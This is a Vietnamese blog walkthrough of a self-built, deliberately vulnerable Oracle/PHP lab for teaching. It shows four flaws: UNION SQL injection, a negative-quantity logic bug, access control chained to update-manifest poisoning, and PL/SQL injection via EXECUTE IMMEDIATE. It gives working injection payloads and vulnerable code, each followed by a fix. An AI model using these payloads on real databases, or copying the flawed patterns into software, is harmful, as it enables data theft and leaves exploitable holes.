---
layout: post
title: "OracleSecLab — bốn lỗ hổng web kiểu Oracle, từ đầu tới cuối"
date: 2026-11-13
author: Nguyen Nam Khanh
tags: [oracle, sql-injection, plsql, business-logic, supply-chain, ctf, walkthrough]
description: >
  Walkthrough thực hành về OracleSecLab, một cổng thông tin sinh viên Oracle +
  PHP cố ý để lỗ hổng do tôi tự viết: UNION SQL injection, lỗi logic số lượng
  âm, chuỗi khai thác broken access control + supply-chain, và PL/SQL injection
  qua EXECUTE IMMEDIATE — mỗi lỗi đều được giải thích, khai thác, rồi vá lại.
---

[English]({{ '/2026/11/13/oracle-sec-lab-walkthrough.html' | relative_url }}) · **Tiếng Việt**

> **Chỉ dùng trong lab.** OracleSecLab là ứng dụng *cố ý* để lỗ hổng mà tôi viết
> để dạy về an toàn cơ sở dữ liệu. Mọi thao tác dưới đây đều thực hiện trên bản
> của chính tôi, chạy ở `localhost` trong Docker. Các điểm yếu là có chủ đích —
> đừng bao giờ nhắm các kỹ thuật này vào hệ thống bạn không sở hữu hoặc không
> được phép kiểm thử.

Phần lớn các dự án "web app có lỗ hổng" bạn gặp khi mới học — DVWA, WebGoat,
Juice Shop — đều nằm trên MySQL, PostgreSQL hay SQLite. Oracle là một giống loài
khác: cú pháp SQL riêng (`DUAL`, `ROWNUM`, `USER_TABLES`, `FETCH FIRST`), mô hình
stored-program PL/SQL riêng, và những lối injection, enumeration riêng. Nên tôi
dựng **[OracleSecLab](https://github.com/Khanh1916/oracle-sec-lab)** — một cổng
thông tin sinh viên sát thực tế ("FPT Student Portal") trên **Oracle 23c Free +
PHP 8.3 + Apache**, với bốn lỗ hổng cố ý giấu giữa hàng chục trang hoàn toàn an
toàn.

Bài này là walkthrough nhìn-từ-góc-độ-kẻ-tấn-công cho cả bốn lỗ hổng. Mỗi lỗi
tôi trình bày phần recon, payload chạy thật trên app, *vì sao* nó hoạt động, và
bản vá nằm trong `secure_versions/` của repo. Nó thay thế cho một walkthrough ba
lỗi cũ hơn tôi từng viết cho phiên bản trước của app — từ đó code đã mọc thêm lỗ
hổng thứ tư (PL/SQL injection) và thực tế hơn nhiều.

Bốn thử thách:

| # | Lỗ hổng | Ở đâu | OWASP 2021 |
|---|---|---|---|
| 1 | Oracle UNION SQL injection (flag phân mảnh) | `search.php?q=` | A03 Injection |
| 2 | Lỗi logic nghiệp vụ (số lượng âm) | `store.php` | A04 Insecure Design |
| 3 | Broken access control → supply-chain poisoning | `partner_config.php` + `admin.php` | A01 / A06 |
| 4 | Oracle PL/SQL injection (`EXECUTE IMMEDIATE`) | `course_lookup.php` | A03 Injection |

---

## Tự chạy thử

Cả cái lab gói trong một câu lệnh. Không cần cài Oracle thủ công:

```bash
git clone https://github.com/Khanh1916/oracle-sec-lab.git
cd oracle-sec-lab
RANDOMIZE_FLAGS=1 docker compose up -d
```

Rồi mở **http://localhost:8080/dbs401-oracle-app** và đăng nhập. Các tài khoản đã
seed sẵn mà tôi dùng dưới đây:

| Username | Password | Vai trò |
|---|---|---|
| `student1` | `Student@123` | Sinh viên (150 credit) |
| `admin` | `Admin@DBS401!2024` | Admin |

> **Một lưu ý về flag.** Mọi flag trong lab đều có dạng `DBS401{...}`. Tôi chạy
> bản của mình với `RANDOMIZE_FLAGS=1`, nên mỗi flag trong ảnh chụp là một giá
> trị dùng-một-lần, riêng cho container đó — không phải đáp án chuẩn. Đó là chủ
> ý: tôi muốn bạn theo được *phương pháp* mà không bị tôi đưa luôn chuỗi cuối.
> Hãy tự giải trên bản của bạn và bạn sẽ có flag của riêng mình.

Đây là cổng thông tin sau khi đăng nhập bằng `student1` — một dashboard học vụ
trông rất thật. Toàn bộ giao diện này không liên quan gì đến các lỗ hổng; nó chỉ
là lớp ngụy trang.

![Dashboard của FPT Student Portal sau khi đăng nhập bằng tài khoản sinh viên]({{ '/images/oracle-sec-lab/00-dashboard.jpg' | relative_url }})

---

## Thử thách 1 — Oracle UNION SQL injection

### Tìm điểm injection

Trang **Student Search** (`search.php`) trông bình thường. Tìm một chuyên ngành
có thật và bạn nhận về một bảng sinh viên gọn gàng:

![Tìm bình thường với "Software" trả về danh sách sinh viên]({{ '/images/oracle-sec-lab/01-search-normal.jpg' | relative_url }})

Cú thăm dò SQL injection kinh điển đầu tiên là một dấu nháy đơn. Gửi `?q='` và
trang vỡ — nhưng vỡ một cách lịch sự, với lỗi bị bắt chứ không phải stack trace:

![Một dấu nháy đơn làm hiện "Search failed. Please check your input."]({{ '/images/oracle-sec-lab/02-search-quote-error.jpg' | relative_url }})

Cái "Search failed" đó là dấu hiệu. Dấu nháy đã chạm tới database và làm hỏng cú
pháp câu truy vấn. Bên dưới, `search.php` dựng SQL bằng cách dán thẳng input vào
chuỗi:

```php
$sql = "SELECT student_id, full_name, major FROM STUDENTS
        WHERE (full_name LIKE '%$keyword%' OR major LIKE '%$keyword%')
          AND hidden_marker = 'NORMAL' AND ROWNUM <= 5";
```

Input của ta rơi vào *bên trong* một literal `LIKE '%...%'`, mà literal này lại
nằm trong dấu ngoặc đơn. Vậy để chiếm quyền câu truy vấn, ta phải (a) đóng dấu
`%` và dấu nháy, (b) đóng dấu ngoặc, và (c) comment phần còn lại phía sau. Nên
tiền tố để thoát ra là `KEYWORD%') ... --`.

### Để ý cái blacklist từ khóa

Có một cái gờ giảm tốc: một blacklist chặn các từ mang hơi hướng DDL.

```php
$ddlBlacklist = ['DROP','DELETE','UPDATE','INSERT','CREATE','ALTER','TRUNCATE'];
```

`UNION SELECT` không có trong danh sách nên injection đọc dữ liệu đi lọt. Nhưng
để ý cái bẫy cho sau này: phép kiểm tra là so khớp chuỗi con, không phân biệt
hoa thường, nên đúng chữ `update_url` (nó chứa **UPDATE**) sẽ bị chặn. Nhớ điều
này cho Thử thách 3.

### Số lượng cột và kiểu dữ liệu

`UNION` của Oracle đòi hai vế cùng số cột *và* kiểu tương thích, và mỗi `SELECT`
đều cần một `FROM` (đó là lý do có `DUAL`). Payload ngây thơ
`UNION SELECT 1,2,3 FROM DUAL` thực ra lỗi ở đây, vì cột 2 và 3 bên trái là
`VARCHAR2` còn bên phải là số — Oracle rất khó tính chuyện đó. Đưa chuỗi vào thì
khớp:

```sql
-- ba cột: NUMBER, VARCHAR2, VARCHAR2
x%') UNION SELECT 1,'a','b' FROM DUAL--
```

### Liệt kê các bảng

`USER_TABLES` liệt kê mọi bảng thuộc schema của app. Ta đặt `table_name` vào một
trong hai cột chuỗi:

```sql
x%') UNION SELECT ROWNUM, table_name, NULL FROM USER_TABLES WHERE ROWNUM<=14--
```

![UNION injection liệt kê các bảng của schema, gồm FLAGS và CONFIG_STORE]({{ '/images/oracle-sec-lab/03-union-tables.jpg' | relative_url }})

Những cái tên đáng chú ý nhảy ra: `FLAGS`, `AUDIT_LOGS`, `CONFIG_STORE`,
`ADMIN_SECRETS`, `SYSTEM_HINTS`, và vài mồi nhử lộ liễu — `FAKE_FLAGS`,
`FLAG_ARCHIVE`. Lab đầy decoy để trừng phạt ai chỉ đi grep mỗi chữ "flag".

### Flag chia làm ba mảnh, ba kiểu mã hóa

Dump bảng `FLAGS` không cho bạn một flag — nó cho một *mảnh*, kèm một decoy:

```sql
x%') UNION SELECT 1, flag_code, flag_part FROM FLAGS--
```

![Bảng FLAGS cho ra một mảnh hex thật và một decoy base64]({{ '/images/oracle-sec-lab/04-flags-fragments.jpg' | relative_url }})

`FL1_PART_A` là một chuỗi hex (`4442...` → giải mã dạng byte hex → bắt đầu bằng
`DBS401{SQL_`). `FL_DECOY_B` là base64 giải ra vui vẻ thành
`SOME_FAKE_FLAG_HERE` — bỏ qua nó. Hai mảnh thật còn lại giấu ở chỗ khác, với các
kiểu mã hóa *khác nhau*, và đó mới là trọng tâm của thử thách:

- **Mảnh B** nằm trong `AUDIT_LOGS.metadata_note` dưới dạng một khối JSON có
  trường `"fragment"` được viết **ngược** — đảo chuỗi lại để đọc.
- **Mảnh C** nằm trong `CONFIG_STORE` ở khóa `sys_alpha_marker`, mã hóa
  **base64**.

```sql
-- Mảnh B
x%') UNION SELECT 1, metadata_note, action FROM AUDIT_LOGS
     WHERE action='SYSTEM_AUDIT_CHECK'--

-- Mảnh C
x%') UNION SELECT 1, config_value, config_key FROM CONFIG_STORE
     WHERE config_key='sys_alpha_marker'--
```

Giải mã từng mảnh (hex → ASCII, đảo ngược chuỗi, base64 → ASCII) rồi ghép lại.
Ba mảnh khớp vào nhau thành một flag `DBS401{SQL_..._..._...}` duy nhất. Còn có
hai decoy base64 nằm trong `CONFIG_STORE` (`sys_beta_marker`) và `FLAGS` để làm
tốn thời gian của scanner tự động — nhắc nhở rằng "giải mã ra sạch sẽ" không đồng
nghĩa với "đúng".

### Bản vá

Ngừng nối chuỗi. Bind tham số và ràng buộc input:

```php
$param = '%' . strtolower($keyword) . '%';
$sql   = "SELECT student_id, full_name, major FROM STUDENTS
          WHERE LOWER(full_name) LIKE :kw";
$stmt  = oci_parse($conn, $sql);
oci_bind_by_name($stmt, ':kw', $param);
oci_execute($stmt);
```

Blacklist không phải là biện pháp phòng thủ — nó là danh sách việc-cần-làm cho kẻ
tấn công. Bind variable mới là phòng thủ. (Xem `secure_versions/search_secure.php`.)

---

## Thử thách 2 — số lượng âm là tiền chùa

**Material Store** (`store.php`) bán một tài liệu học rẻ tiền (100 credit) và một
món khóa đầy hấp dẫn, *"Exam Leak 2024 (CLASSIFIED)"*, giá 999,999 credit. Sinh
viên của ta có 150. Thoạt nhìn thì vô vọng.

![Store: 150 credit, một món rẻ, và một món khóa giá 999,999 credit]({{ '/images/oracle-sec-lab/06-store-before.jpg' | relative_url }})

Server kiểm tra xem bạn có đủ tiền cho đơn hàng không, nhưng không bao giờ kiểm
tra số lượng có dương hay không:

```php
$cost = $qty * $price;            // qty lấy thẳng từ form
if ($credits >= $cost) {
    $newCredits = $credits - $cost;   // trừ một số âm = cộng
}
```

Đặt mua **−10,000** cuốn tài liệu 100-credit và phép tính đảo ngược:

```text
cost        = -10,000 * 100          = -1,000,000
new_credits =    150 - (-1,000,000)  =  1,000,150
```

Trừ đi một số âm tức là *cộng* nó vào. Số dư vọt qua mốc 999,999, và món tài liệu
khóa mở ngay tại chỗ:

![Sau khi đặt số lượng âm, credit nhảy lên 1,000,150 và flag mở khóa]({{ '/images/oracle-sec-lab/07-store-flag.jpg' | relative_url }})

Không injection, không công cụ đặc biệt — chỉ là một input mà người thiết kế
không bao giờ hình dung tới. Đó là lý do nó thuộc A04, *Insecure Design*: đoạn
code làm đúng chính xác những gì nó được viết ra để làm.

### Bản vá

Kiểm tra biên ở phía server, mọi lần:

```php
if ($qty <= 0 || $qty > 100) {
    $msg = "Quantity must be between 1 and 100.";
} elseif ($credits < $cost) {
    $msg = "Insufficient credits.";
} else {
    $newCredits = $credits - $cost;
}
```

`min="1"` trên ô input phía client chỉ là trang trí; kẻ tấn công không bao giờ
dùng form của bạn. (Xem `secure_versions/store_secure.php`.)

---

## Thử thách 3 — từ broken access control tới đầu độc supply-chain

Lỗi này là một chuỗi. Trang admin có thể "kiểm tra cập nhật": nó đọc một **URL
manifest đối tác** từ database, tải JSON đó về, và nếu manifest khai báo phiên
bản mới hơn thì xử lý payload. Đầu độc cái URL đó là bạn kiểm soát được thứ mà
server của admin sẽ tải về.

### Recon: tìm cấu hình ẩn

Trang admin chỉ hiển thị các dòng cấu hình *công khai*. Dòng ngon nhất —
`update_url` — bị đánh dấu riêng tư nên không bao giờ hiện trên giao diện. Nhưng
ta đã có SQL injection từ Thử thách 1, nên ta dump thẳng `CONFIG_STORE`.

Đây là lúc cái blacklist cắn ta: payload chứa chữ `update_url` sẽ bị từ chối (nó
chứa "UPDATE"). Cách lách đơn giản là **đừng gọi tên nó** — dump cả bảng rồi đọc
dòng đó từ kết quả:

```sql
x%') UNION SELECT 1, config_key, config_value FROM CONFIG_STORE
     WHERE config_key NOT LIKE 'runtime%'--
```

![SQLi lộ ra update_url riêng tư và app_version từ CONFIG_STORE]({{ '/images/oracle-sec-lab/05-config-recon.jpg' | relative_url }})

Giờ ta biết server tải cập nhật từ `http://127.0.0.1:8081/manifest.json` và
`app_version` hiện tại là `3.1.0`. Để kích hoạt luồng cập nhật, manifest của ta
phải khai một phiên bản *cao hơn*.

### Broken access control: trang cấu hình tin tưởng bất kỳ ai

Có một trang ẩn, `partner_config.php`, cho phép đổi cái URL đó. Nó ghi nhãn
**"ADMIN ONLY"** — nhưng cái nhãn là thứ duy nhất canh giữ. Code chỉ kiểm tra bạn
đã đăng nhập hay chưa, ngoài ra không gì khác. Vậy nên một sinh viên bình thường
đi thẳng vào và chỉnh hạ tầng của đối tác:

![Một sinh viên đã đăng nhập mở được trang cấu hình đối tác vốn chỉ dành cho admin]({{ '/images/oracle-sec-lab/08-partner-config-student.jpg' | relative_url }})

Ta trỏ URL manifest tới một payload do ta chọn. (Trong một đợt đánh giá thật, bạn
sẽ host nó trên máy của mình; trong lab tôi phục vụ sẵn một manifest thứ hai,
`demo.json`, khai phiên bản `9.9.9` và mang theo `flag_part` cần thiết.) Sinh
viên lưu thành công — kiểm soát truy cập đơn giản là không được thực thi:

![Sinh viên ghi đè thành công URL manifest đối tác]({{ '/images/oracle-sec-lab/09-partner-poisoned.jpg' | relative_url }})

### Bẫy sập khi vào vai admin

Giờ admin "kiểm tra cập nhật" (`admin.php?check_updates=1`). Server tải manifest
đã bị đầu độc của ta, thấy `9.9.9 > 3.1.0`, tin nó, lấy `flag_part` hex từ file
của *ta*, ghép với nửa bí mật nằm ở server, rồi hex-decode kết quả in thẳng ra
trang:

![Lần kiểm tra cập nhật của admin tải manifest độc hại và để lộ flag supply-chain]({{ '/images/oracle-sec-lab/10-admin-flag.jpg' | relative_url }})

"Update successful! System upgraded to version 9.9.9" — và flag rơi ra. Một sinh
viên không có quyền gì đã khiến code/dữ liệu do mình chọn được thực thi trong bối
cảnh tin cậy của admin. Đó đúng là hình dạng của một cuộc tấn công supply-chain
thật: bạn không chọc thủng mục tiêu, bạn chọc thủng thứ mà mục tiêu *tin tưởng*.

### Bản vá

Ba thất bại độc lập, ba bản vá:

1. **Thực thi vai trò.** `partner_config.php` phải kiểm tra
   `$_SESSION['role'] === 'admin'` trước khi ghi bất cứ gì.
2. **Allowlist nguồn gốc.** URL cập nhật phải được đối chiếu với một danh sách
   ngắn các host được duyệt, không nhận chuỗi tự do.
3. **Xác minh chữ ký.** Ký manifest (HMAC/RSA) và từ chối thứ gì không xác minh
   được — số phiên bản cao hơn không phải bằng chứng về tính xác thực.

(Xem `secure_versions/partner_config_secure.php` và `admin_update_secure.php`.)

---

## Thử thách 4 — PL/SQL injection qua EXECUTE IMMEDIATE

Lỗi cuối là lỗi "Oracle" nhất, và là lỗi tôi thích nhất, vì nó trông *an toàn*.
Trang tra cứu **Course Info** (`course_lookup.php`) truyền mã môn học dưới dạng
một **bind variable**:

```php
$sql = "SELECT FN_COURSE_LOOKUP(:code) AS info FROM DUAL";
oci_bind_by_name($stmt, ':code', $code);   // đúng chuẩn sách giáo khoa đấy chứ?
```

Bất kỳ scanner nào chỉ nhìn phần PHP sẽ coi đoạn này sạch. Một mã bình thường trả
về một tên môn bình thường:

![Tra cứu một mã môn bình thường trả về "Database Security"]({{ '/images/oracle-sec-lab/11-course-normal.jpg' | relative_url }})

Nhưng bind ở điểm gọi không cứu được gì nếu bản thân *stored function* mới là thứ
dính lỗi. Nhìn vào trong `FN_COURSE_LOOKUP`:

```sql
v_sql := 'SELECT course_name FROM COURSES WHERE course_code = ''' || p_code || '''';
EXECUTE IMMEDIATE v_sql INTO v_result;
```

Giá trị được bind về tới PL/SQL một cách an toàn — rồi function dựng lại một chuỗi
SQL bằng cách nối chuỗi và chạy nó bằng `EXECUTE IMMEDIATE`. Injection xảy ra
*bên trong database*, thấp hơn một tầng so với nơi PHP "bảo vệ" nó. Đây là bài
học cốt lõi: **một bind variable chỉ bảo vệ đúng câu lệnh mà nó được bind vào.**

### Cái bẫy một-dòng

Function trả về một giá trị qua `... INTO v_result`, nên câu truy vấn bạn inject
phải trả về **đúng một dòng**. Flag nằm trong bảng `PLSQL_VAULT`, mà bảng này còn
có một dòng decoy, nên payload hiển nhiên sẽ trả về hai dòng và Oracle ném ra
`TOO_MANY_ROWS`, được function báo thành "Ambiguous result":

```sql
zzz' UNION SELECT secret_flag FROM PLSQL_VAULT--
```

![UNION ngây thơ trả về hai dòng và lỗi "Ambiguous result"]({{ '/images/oracle-sec-lab/12-course-ambiguous.jpg' | relative_url }})

Lọc xuống còn đúng một dòng thật và flag quay về, cải trang thành một tên môn
học:

```sql
zzz' UNION SELECT secret_flag FROM PLSQL_VAULT WHERE label='CHALLENGE_4'--
```

![Lọc còn một dòng, trích được Flag 4 qua PL/SQL injection]({{ '/images/oracle-sec-lab/13-course-flag.jpg' | relative_url }})

### Bản vá

Sửa cái stored program, chứ không chỉ điểm gọi. Ưu tiên SQL tĩnh, không có chuỗi
động nào cả:

```sql
SELECT course_name INTO v_result FROM COURSES WHERE course_code = p_code;
```

Nếu thật sự cần SQL động, hãy **bind** cả bên trong `EXECUTE IMMEDIATE`, và không
bao giờ nối chuỗi input người dùng:

```sql
EXECUTE IMMEDIATE 'SELECT course_name FROM COURSES WHERE course_code = :c'
  INTO v_result USING p_code;
```

Và chạy function với **invoker's rights** (`AUTHID CURRENT_USER`) để role của web
không với tới được những bảng như `PLSQL_VAULT` thông qua nó. (Xem
`secure_versions/course_lookup_secure.php`.)

---

## Lab này thực sự dạy điều gì

Bốn lỗi, bốn nguyên nhân gốc khác nhau — và không cái nào kỳ bí cả:

- **Thử thách 1 — tin vào blacklist.** SQL dựng bằng chuỗi cộng với một denylist
  từ khóa là injection đang chờ xảy ra. Bind variable, đừng blocklist.
- **Thử thách 2 — tin vào client.** Form trên trình duyệt nói "1 trở lên"; kẻ tấn
  công nói "−10,000". Hãy kiểm tra mọi biên ở phía server.
- **Thử thách 3 — tin vào một cái nhãn và một con số phiên bản.** Banner "ADMIN
  ONLY" không phải là kiểm soát truy cập, và phiên bản lớn hơn không phải là chữ
  ký. Thực thi vai trò, allowlist nguồn gốc, xác minh payload.
- **Thử thách 4 — tin nhầm tầng.** Một bind variable ở ranh giới PHP là vô giá
  trị nếu stored function đi nối chuỗi và `EXECUTE IMMEDIATE`. Hãy sửa đúng đoạn
  code thực sự dựng câu truy vấn.

Mỗi lỗi đều có một bản đã làm cứng tương ứng trong `secure_versions/` của repo,
nên bạn có thể diff bản có lỗ hổng và bản an toàn cạnh nhau. Nếu muốn thử chay,
hãy tải lab về và giải trước khi đọc lại bài này — flag trong container của bạn
sẽ là của riêng bạn.

> Mã nguồn và hướng dẫn cài đặt đầy đủ: **[github.com/Khanh1916/oracle-sec-lab](https://github.com/Khanh1916/oracle-sec-lab)**

---

*Viết bởi **Nguyễn Nam Khánh** ([@Khanh1916](https://github.com/Khanh1916)).*
